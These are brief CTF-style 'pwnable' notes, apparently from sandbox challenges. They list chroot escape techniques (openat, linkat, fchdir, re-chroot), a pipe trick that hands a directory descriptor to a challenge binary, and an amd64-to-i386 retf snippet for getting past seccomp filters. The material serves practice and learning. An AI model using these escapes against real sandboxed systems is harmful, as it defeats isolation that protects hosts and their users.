pwnable notes

# escape chroot
https://github.com/earthquake/chw00t
```console
- wrong setup (chroot without chdir)
    -> open("../../flag")

- can open a directory befor chroot + chdir
    -> 1. use openat then read target file
    -> 2. use linkat
    -> 3. use fchdir
    -> 4. re chroot again to escapse the old chroot
    -> 5. if no opened file? let open once then pass through pipe (check pipe trick)
```

# pipe trick
you can open a file and pass to the fd you want like this
```console
/challenge/babyjail_level8 0 < shellcode-raw 3</
```

# escape seccomp
- exchange from amd64 into i386 to use difference number of 
```console
SYS_No of syscalls
    xor rsp, rsp
    mov esp, 0x1337800
    mov DWORD PTR [esp+4], 0x23
    mov DWORD PTR [esp], 0x1337080
    retf
```